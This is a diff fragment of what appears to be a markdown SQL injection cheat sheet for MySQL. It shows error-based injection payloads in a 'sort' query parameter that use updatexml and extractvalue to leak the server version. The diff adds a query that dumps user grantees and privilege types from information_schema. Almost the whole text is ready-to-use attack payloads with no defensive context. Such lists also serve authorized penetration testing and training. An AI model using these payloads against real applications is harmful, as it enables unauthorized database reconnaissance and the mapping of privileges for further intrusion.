@@ -144,3 +144,7 @@ Note: `PROCEDURE ANALYSE()` is deprecated as of MySQL 5.7.18, and is removed in 
 + `?sort=1 AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)`
 + `?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)`
 
+## 0x6 Post, USER_PRIVILEGES
+
++ `SELECT  group_concat(concat(GRANTEE,",",TABLE_CATALOG,",",PRIVILEGE_TYPE,",",IS_GRANTABLE) SEPARATOR '|') FROM information_schema.USER_PRIVILEGES`
+
